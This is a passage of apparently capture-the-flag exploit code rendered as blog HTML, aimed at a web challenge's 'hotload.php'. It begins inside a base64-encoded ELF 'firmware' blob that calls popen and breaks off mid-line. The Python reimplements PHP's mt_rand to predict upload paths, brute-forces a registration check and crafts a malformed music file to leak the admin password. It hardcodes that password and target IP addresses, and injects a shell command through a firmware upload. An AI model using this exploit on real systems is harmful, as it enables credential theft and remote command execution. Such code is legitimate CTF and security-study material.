AAAAwAXAGBAAAAAAAAAAAAAAAAAAAAAAAAAAwAYAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAgAMAIAQAAAAAAAAAAAAAAAAAAAOAAAAAgAMALAQAAAAAAAAAAAAAAAAAAAhAAAAAgAMAPAQAAAAAAAAAAAAAAAAAAA3AAAAAQAXAGBAAAAAAAAAAQAAAAAAAABGAAAAAQASABA+AAAAAAAAAAAAAAAAAABtAAAAAgAMADARAAAAAAAAAAAAAAAAAAB5AAAAAQARAAA+AAAAAAAAAAAAAAAAAACYAAAABADx/wAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAACjAAAAAQAQAKghAAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAACxAAAAAgANAKwRAAAAAAAAAAAAAAAAAAC3AAAAAQAWADhAAAAAAAAAAAAAAAAAAADEAAAAAQATABg+AAAAAAAAAAAAAAAAAADNAAAAAAAPAAwhAAAAAAAAAAAAAAAAAADgAAAAAQAWAEhAAAAAAAAAAAAAAAAAAADsAAAAAQAVAABAAAAAAAAAAAAAAAAAAAACAQAAAgAJAAAQAAAAAAAAAAAAAAAAAAAIAQAAIAAAAAAAAAAAAAAAAAAAAAAAAAAkAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAA3AQAAEgAMADURAAAAAAAAdgAAAAAAAAA7AQAAEgAAAAAAAAAAAAAAAAAAAAAAAABPAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABjAQAAIAAAAAAAAAAAAAAAAAAAAAAAAACGAQAAEQAWAEBAAAAAAAAACAAAAAAAAAByAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACFAQAAEQAXAIBAAAAAAAAAMAEAAAAAAACOAQAAIAAAAAAAAAAAAAAAAAAAAAAAAACoAQAAIgAAAAAAAAAAAAAAAAAAAAAAAAAAY3J0c3R1ZmYuYwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjczMjUAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AGZpcm13YXJlLmMAX19GUkFNRV9FTkRfXwBfZmluaQBfX2Rzb19oYW5kbGUAX0RZTkFNSUMAX19HTlVfRUhfRlJBTUVfSERSAF9fVE1DX0VORF9fAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBfaW5pdABfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAZnJlYWRAQEdMSUJDXzIuMi41AGZ1bgBwY2xvc2VAQEdMSUJDXzIuMi41AG1lbXNldEBAR0xJQkNfMi4yLjUAX19nbW9uX3N0YXJ0X18AcG9wZW5AQEdMSUJDXzIuMi41AF92ZXJzaW9uAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5pbml0AC5wbHQuZ290AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRfYXJyYXkALmZpbmlfYXJyYXkALmR5bmFtaWMALmdvdC5wbHQALmRhdGEALmJzcwAuY29tbWVudAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGwAAAAcAAAACAAAAAAAAADgCAAAAAAAAOAIAAAAAAAAkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAC4AAAD2//9vAgAAAAAAAABgAgAAAAAAAGACAAAAAAAAMAAAAAAAAAADAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAA4AAAACwAAAAIAAAAAAAAAkAIAAAAAAACQAgAAAAAAACABAAAAAAAABAAAAAEAAAAIAAAAAAAAABgAAAAAAAAAQAAAAAMAAAACAAAAAAAAALADAAAAAAAAsAMAAAAAAACSAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAEgAAAD///9vAgAAAAAAAABCBAAAAAAAAEIEAAAAAAAAGAAAAAAAAAADAAAAAAAAAAIAAAAAAAAAAgAAAAAAAABVAAAA/v//bwIAAAAAAAAAYAQAAAAAAABgBAAAAAAAACAAAAAAAAAABAAAAAEAAAAIAAAAAAAAAAAAAAAAAAAAZAAAAAQAAAACAAAAAAAAAIAEAAAAAAAAgAQAAAAAAADwAAAAAAAAAAMAAAAAAAAACAAAAAAAAAAYAAAAAAAAAG4AAAAEAAAAQgAAAAAAAABwBQAAAAAAAHAFAAAAAAAAYAAAAAAAAAADAAAAFQAAAAgAAAAAAAAAGAAAAAAAAAB4AAAAAQAAAAYAAAAAAAAAABAAAAAAAAAAEAAAAAAAABcAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAcwAAAAEAAAAGAAAAAAAAACAQAAAAAAAAIBAAAAAAAABQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAH4AAAABAAAABgAAAAAAAABwEAAAAAAAAHAQAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAACHAAAAAQAAAAYAAAAAAAAAgBAAAAAAAACAEAAAAAAAACsBAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAjQAAAAEAAAAGAAAAAAAAAKwRAAAAAAAArBEAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAJMAAAABAAAAAgAAAAAAAAAAIAAAAAAAAAAgAAAAAAAACQEAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACbAAAAAQAAAAIAAAAAAAAADCEAAAAAAAAMIQAAAAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAqQAAAAEAAAACAAAAAAAAADAhAAAAAAAAMCEAAAAAAAB8AAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAALMAAAAOAAAAAwAAAAAAAAAAPgAAAAAAAAAuAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAC/AAAADwAAAAMAAAAAAAAAED4AAAAAAAAQLgAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAywAAAAYAAAADAAAAAAAAABg+AAAAAAAAGC4AAAAAAADAAQAAAAAAAAQAAAAAAAAACAAAAAAAAAAQAAAAAAAAAIIAAAABAAAAAwAAAAAAAADYPwAAAAAAANgvAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADUAAAAAQAAAAMAAAAAAAAAAEAAAAAAAAAAMAAAAAAAADgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA3QAAAAEAAAADAAAAAAAAADhAAAAAAAAAODAAAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAOMAAAAIAAAAAwAAAAAAAABgQAAAAAAAAEgwAAAAAAAAUAEAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAADoAAAAAQAAADAAAAAAAAAAAAAAAAAAAABIMAAAAAAAABwAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAaDAAAAAAAAAoBQAAAAAAABoAAAAsAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAAJA1AAAAAAAAxAEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAABUNwAAAAAAAPEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">php_rand</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    MT_RAND_MT19937 = <span class="number">0</span></span><br><span class="line">    MT_RAND_PHP = <span class="number">1</span></span><br><span class="line">    php_N = <span class="number">624</span></span><br><span class="line">    php_M = <span class="number">397</span></span><br><span class="line">    php_left = <span class="number">0</span></span><br><span class="line">    php_next = <span class="number">0</span></span><br><span class="line">    php_state = [<span class="number">0</span>] * (php_N + <span class="number">1</span>)</span><br><span class="line">    php_mode = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, seed, mode=<span class="number">0</span>)</span>:</span></span><br><span class="line">        self.php_mt_srand(seed)</span><br><span class="line">        self.php_mode = mode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">seed</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        self.php_mt_srand(seed)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rand</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.php_mt_rand()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hiBit</span><span class="params">(self, u)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> u &amp; <span class="number">0x80000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loBit</span><span class="params">(self, u)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> u &amp; <span class="number">0x00000001</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loBits</span><span class="params">(self, u)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> u &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mixBits</span><span class="params">(self, u, v)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.hiBit(u) | self.loBits(v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twist</span><span class="params">(self, m, u, v)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> m ^ (self.mixBits(u, v) &gt;&gt; <span class="number">1</span>) ^ ((-self.loBit(v)) &amp; <span class="number">0x9908b0df</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twist_php</span><span class="params">(self, m, u, v)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> m ^ (self.mixBits(u, v) &gt;&gt; <span class="number">1</span>) ^ ((-self.loBit(u)) &amp; <span class="number">0x9908b0df</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">php_mt_initialize</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        state = self.php_state</span><br><span class="line">        N = self.php_N</span><br><span class="line">        state[<span class="number">0</span>] = seed &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N):</span><br><span class="line">            state[i] = (<span class="number">1812433253</span> * (state[i - <span class="number">1</span>] ^ (state[i - <span class="number">1</span>] &gt;&gt; <span class="number">30</span>)) + i) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        self.php_state = state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">php_mt_reload</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.php_left = <span class="number">0</span></span><br><span class="line">        state = self.php_state</span><br><span class="line">        N = self.php_N</span><br><span class="line">        M = self.php_M</span><br><span class="line">        p = <span class="number">0</span></span><br><span class="line">        i = N - M</span><br><span class="line">        <span class="keyword">if</span> self.php_mode == self.MT_RAND_MT19937:</span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">                state[p] = self.twist(state[p + M],state[p + <span class="number">0</span>],state[p + <span class="number">1</span>])</span><br><span class="line">                p += <span class="number">1</span></span><br><span class="line">            i = M - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                state[p] = self.twist(state[p+M-N],state[p + <span class="number">0</span>],state[p + <span class="number">1</span>])</span><br><span class="line">                p += <span class="number">1</span></span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">            state[p] = self.twist(state[p + M - N],state[p + <span class="number">0</span>],state[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">                state[p] = self.twist_php(state[p + M],state[p + <span class="number">0</span>],state[p + <span class="number">1</span>])</span><br><span class="line">                p += <span class="number">1</span></span><br><span class="line">            i = M - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                state[p] = self.twist_php(state[p + M - N],state[p + <span class="number">0</span>],state[p + <span class="number">1</span>])</span><br><span class="line">                p += <span class="number">1</span></span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">            state[p] = self.twist_php(state[p + M - N],state[p + <span class="number">0</span>],state[<span class="number">0</span>])</span><br><span class="line">        self.php_left = N</span><br><span class="line">        self.php_next = <span class="number">0</span></span><br><span class="line">        self.php_state = state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">php_mt_srand</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        self.php_mt_initialize(seed)</span><br><span class="line">        self.php_mt_reload()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">php_mt_rand</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.php_left == <span class="number">0</span>: self.php_mt_reload()</span><br><span class="line">        self.php_left -= <span class="number">1</span></span><br><span class="line">        s1 = self.php_state[self.php_next]</span><br><span class="line">        s1 ^= (s1 &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        s1 ^= (s1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">        s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">        self.php_next += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> ( s1 ^ (s1 &gt;&gt; <span class="number">18</span>)) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get random string</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rand_str</span><span class="params">(length=<span class="number">8</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits, length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get method</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(session, url)</span>:</span></span><br><span class="line">    retry = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        retry += <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> session:</span><br><span class="line">                r = s.get(url, timeout=timeout)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r = requests.get(url, timeout=timeout)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> retry &gt;= retry_count:</span><br><span class="line">                print(<span class="string">'timeout or http 500'</span>)</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># post method</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(session, url, data, files=<span class="string">''</span>)</span>:</span></span><br><span class="line">    retry = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        retry += <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> session:</span><br><span class="line">                <span class="keyword">if</span> files==<span class="string">''</span>:</span><br><span class="line">                    r = s.post(url, data=data, timeout=timeout)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r = s.post(url, data=data, files=files, timeout=timeout)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> files==<span class="string">''</span>:</span><br><span class="line">                    r = requests.post(url, data=data, timeout=timeout)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r = requests.post(url, data=data, files=files, timeout=timeout)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> retry &gt;= retry_count:</span><br><span class="line">                print(<span class="string">'timeout or http 500'</span>)</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># login with username and password</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=login'</span></span><br><span class="line">    data = &#123;<span class="string">'username'</span>: username, <span class="string">'password'</span>: password&#125;</span><br><span class="line">    <span class="keyword">if</span> logging: print(url)</span><br><span class="line">    <span class="keyword">if</span> logging: print(data)</span><br><span class="line">    res = post(<span class="number">1</span>, url, data)</span><br><span class="line">    <span class="keyword">if</span> logging: print(res.text)</span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=upload'</span></span><br><span class="line">    res = get(<span class="number">1</span>, url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'fileuploaded'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># reg with username and password</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=reg'</span></span><br><span class="line">    <span class="keyword">if</span> logging: print(url)</span><br><span class="line">    res = get(<span class="number">1</span>, url)</span><br><span class="line">    show_code = <span class="string">''</span></span><br><span class="line">    show_calc = <span class="string">''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        show_code = res.text.split(<span class="string">'show_code"&gt;'</span>)[<span class="number">1</span>].split(<span class="string">'&lt;'</span>)[<span class="number">0</span>]</span><br><span class="line">        show_calc = res.text.split(<span class="string">'show_calc"&gt;'</span>)[<span class="number">1</span>].split(<span class="string">'&lt;'</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> logging: print(len(show_calc))</span><br><span class="line">        <span class="keyword">if</span> len(show_calc) != <span class="number">6</span>:</span><br><span class="line">            print(<span class="string">'invalid show_calc length'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> logging: print(<span class="string">"show_code"</span>,show_code)</span><br><span class="line">    <span class="keyword">if</span> logging: print(<span class="string">"show_calc"</span>,show_calc)</span><br><span class="line">    code = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100000000</span>):</span><br><span class="line">        code = str(i)</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(code + show_code).hexdigest()[:<span class="number">6</span>] == show_calc.lower(): <span class="keyword">break</span></span><br><span class="line">    data = &#123;<span class="string">'username'</span>: username, <span class="string">'password1'</span>: password, <span class="string">'password2'</span>: password, <span class="string">'code'</span>: code&#125;</span><br><span class="line">    <span class="keyword">if</span> logging: print(data)</span><br><span class="line">    res = post(<span class="number">1</span>, url, data)</span><br><span class="line">    <span class="keyword">if</span> logging: print(res.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># upload music [diff]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_music</span><span class="params">()</span>:</span></span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=upload'</span></span><br><span class="line">    data = &#123;<span class="string">'file_id'</span>: <span class="string">'0'</span>&#125;</span><br><span class="line">    music = preset_music[:<span class="number">0x6</span>] + <span class="string">'\x00\x00\x03\x00'</span> + preset_music[<span class="number">0x0a</span>:<span class="number">0x53</span>]</span><br><span class="line">    music += <span class="string">'\x00\x00\x03\x00'</span> + <span class="string">'\x00\x00\x03'</span> + <span class="string">'a'</span> * <span class="number">0x70</span> + <span class="string">'\x00'</span></span><br><span class="line">    files = &#123;<span class="string">'file_data'</span>: music&#125;</span><br><span class="line">    <span class="keyword">if</span> logging: print(url)</span><br><span class="line">    <span class="keyword">if</span> logging: print(data)</span><br><span class="line">    res = post(<span class="number">1</span>, url, data, files)</span><br><span class="line">    <span class="keyword">if</span> logging: print(res.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># n54LuyJyYLVpVO2w</span></span><br><span class="line">            <span class="keyword">return</span> b64decode(json.loads(res.content.strip())[<span class="string">'artist'</span>])[:<span class="number">16</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># upload firmware [diff]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_firmware</span><span class="params">(command)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(command) &gt; <span class="number">0x100</span>: <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=firmware'</span></span><br><span class="line">    data = &#123;<span class="string">'file_id'</span>: <span class="string">'0'</span>&#125;</span><br><span class="line">    command = command.ljust(<span class="number">0x100</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    firmware = preset_firmare.replace(<span class="string">'a'</span> * <span class="number">0x100</span>, command)</span><br><span class="line">    files = &#123;<span class="string">'file_data'</span>: firmware&#125;</span><br><span class="line">    <span class="keyword">if</span> logging: print(url)</span><br><span class="line">    <span class="keyword">if</span> logging: print(data)</span><br><span class="line">    res = post(<span class="number">1</span>, url, data, files)</span><br><span class="line">    <span class="keyword">if</span> logging: print(<span class="string">"Upload: "</span> + res.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Date'</span> <span class="keyword">in</span> res.headers.keys():</span><br><span class="line">            print(<span class="string">"Date Header: "</span> + res.headers[<span class="string">'Date'</span>])</span><br><span class="line">            <span class="keyword">return</span> int(datetime.strptime(res.headers[<span class="string">'Date'</span>], <span class="string">"%a, %d %b %Y %X %Z"</span>).strftime(<span class="string">"%s"</span>)) + time_zone_offset</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> int(time.time())</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get firmware version</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">firmware_version</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(path)&gt;<span class="number">0x40</span>: <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=firmware'</span></span><br><span class="line">    data = &#123;<span class="string">'path'</span>: path&#125;</span><br><span class="line">    <span class="keyword">if</span> logging: print(url)</span><br><span class="line">    <span class="keyword">if</span> logging: print(data)</span><br><span class="line">    res = post(<span class="number">1</span>, url, data)</span><br><span class="line">    <span class="keyword">if</span> logging: print(res.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> json.loads(res.content.strip())[<span class="string">'info'</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># show result</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_result</span><span class="params">(vuln1, vuln2, msg)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> vuln1 == <span class="number">-1</span>:</span><br><span class="line">        result += <span class="string">'Vuln 1 check: unknown.\n'</span></span><br><span class="line">    <span class="keyword">elif</span> vuln1 == <span class="number">0</span>:</span><br><span class="line">        result += <span class="string">'Vuln 1 check: fail.\n'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += <span class="string">'Vuln 1 check: pass.\n'</span></span><br><span class="line">    <span class="keyword">if</span> vuln2 == <span class="number">-1</span>:</span><br><span class="line">        result += <span class="string">'Vuln 2 check: unknown.\n'</span></span><br><span class="line">    <span class="keyword">elif</span> vuln2 == <span class="number">0</span>:</span><br><span class="line">        result += <span class="string">'Vuln 2 check: fail.\n'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += <span class="string">'Vuln 2 check: pass.\n'</span></span><br><span class="line">    result += msg</span><br><span class="line">    print(result)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    path = <span class="number">0</span></span><br><span class="line">    vuln1 = <span class="number">-1</span></span><br><span class="line">    vuln2 = <span class="number">-1</span></span><br><span class="line">    logined = <span class="number">-1</span></span><br><span class="line">    <span class="keyword">if</span> path == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># username = '1Bq2DT3j'</span></span><br><span class="line">        <span class="comment"># password = 'KWRpkXgHnb'</span></span><br><span class="line">        <span class="comment"># # res = reg(username, password)</span></span><br><span class="line">        <span class="comment"># # if not res: show_result(vuln1, vuln2, 'register fail')</span></span><br><span class="line">        <span class="comment"># res = login(username, password)</span></span><br><span class="line">        <span class="comment"># if not res: show_result(vuln1, vuln2, 'login fail')</span></span><br><span class="line">        <span class="comment"># time.sleep(3)</span></span><br><span class="line">        <span class="comment"># res = upload_music()</span></span><br><span class="line">        <span class="comment"># if res == '':</span></span><br><span class="line">        <span class="comment">#     vuln1 = 0</span></span><br><span class="line">        <span class="comment">#     show_result(vuln1, vuln2, 'leak admin password fail')</span></span><br><span class="line">        admin_password = <span class="string">'Mike84eiNxHcMVCz'</span></span><br><span class="line">        <span class="keyword">global</span> s</span><br><span class="line">        s = requests.session()</span><br><span class="line">        res = login(<span class="string">'admin'</span>, admin_password)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">            vuln1 = <span class="number">0</span></span><br><span class="line">            show_result(vuln1, vuln2, <span class="string">'leak wrong admin password'</span>)</span><br><span class="line">        vuln1 = <span class="number">1</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    guess_server_time = upload_firmware(command)</span><br><span class="line">    print(guess_server_time)</span><br><span class="line">    <span class="keyword">if</span> guess_server_time == <span class="number">-1</span>:</span><br><span class="line">        show_result(vuln1, vuln2, <span class="string">'upload fail'</span>)</span><br><span class="line">    vuln2 = <span class="number">0</span></span><br><span class="line">    succ_keyword = <span class="string">'å›ºä»¶ç‰ˆæœ¬å·ï¼š'</span></span><br><span class="line">    <span class="keyword">if</span> vuln2 == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">            rander = php_rand(guess_server_time - i)</span><br><span class="line">            <span class="comment"># path = hashlib.md5(str(rander.rand()) + '182.91.145.76').hexdigest()</span></span><br><span class="line">            path = hashlib.md5(str(rander.rand()) + <span class="string">'39.108.249.224'</span>).hexdigest()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                prev_flag = firmware_version(path).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span 